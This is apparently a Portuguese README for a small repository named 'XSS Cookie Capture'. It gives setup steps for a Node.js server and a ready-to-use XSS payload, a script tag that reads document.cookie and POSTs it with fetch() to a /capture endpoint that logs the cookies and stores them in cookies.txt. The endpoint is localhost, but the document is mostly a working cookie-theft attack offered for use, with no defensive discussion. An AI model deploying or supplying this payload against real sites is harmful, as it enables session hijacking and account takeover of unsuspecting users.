
# XSS Cookie Capture

Este repositório contém um script de captura de cookies via XSS, que envia os cookies de um site para um servidor backend.

## 🚀 Como Rodar o Projeto

### Pré-requisitos

- **Node.js** instalado na sua máquina.
- **NPM** (gerenciador de pacotes do Node.js).

### Passo a Passo

1. **Clonar o repositório:**

   Primeiro, faça o clone do repositório para sua máquina local:
   ```bash
   git clone <URL_DO_REPOSITORIO>
   cd <Pasta_do_repositorio>
   ```

2. **Instalar dependências:**

   Navegue até a pasta do projeto e instale as dependências necessárias:
   ```bash
   npm install
   ```

3. **Rodar o servidor:**

   Após a instalação das dependências, inicie o servidor Node.js com o comando:
   ```bash
   node server.js
   ```

   O servidor estará rodando na URL: `http://localhost:3000`.

### Testando o Código XSS Localmente

1. **Inserir o Script de XSS:**

   No input insira esse script:

   ```html
   <script>
       var cookies = document.cookie;
       fetch('http://localhost:3000/capture', {
           method: 'POST',
           headers: {
               'Content-Type': 'application/json'
           },
           body: JSON.stringify({ cookies: cookies })
       })
       .then(response => response.json())
       .then(data => console.log('Cookies enviados com sucesso:', data))
       .catch(error => console.error('Erro ao enviar cookies:', error));
   </script>
   ```

   - Isso capturará os cookies do site e os enviará para o servidor em `http://localhost:3000/capture`.

3. **Verificando os cookies no servidor:**

   No servidor, você verá os cookies capturados sendo logados no terminal. Eles também serão armazenados no arquivo cookies.txt.

